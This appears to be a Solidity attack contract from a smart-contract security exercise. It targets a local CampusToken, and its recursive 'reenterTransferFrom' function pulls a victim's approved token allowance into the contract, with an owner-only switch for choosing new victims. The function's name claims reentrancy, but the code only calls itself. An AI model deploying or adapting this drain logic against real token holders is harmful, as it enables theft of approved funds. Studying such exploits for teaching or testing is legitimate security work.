// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "../CampusToken.sol";

contract SC01 {
    CampusToken public token;
    address private victim;
    bool public attackComplete;

    address public owner;

    constructor(address _tokenAddress, address _victim) {
        token = CampusToken(_tokenAddress);
        owner = msg.sender;
        victim = _victim;
        attackComplete = false;
    }

    function reenterTransferFrom() public {
        require(!attackComplete, "Attack done");
        bool success = token.transferFrom(victim, address(this), token.allowance(victim, address(this)));
        if (success) {
            reenterTransferFrom();
        } else {
            attackComplete = true;
        }
    }

    function changeVictim(address newVictim) public {
        require(msg.sender == owner, "Nuh uh!");
        victim = newVictim;
        attackComplete = false;
    }
}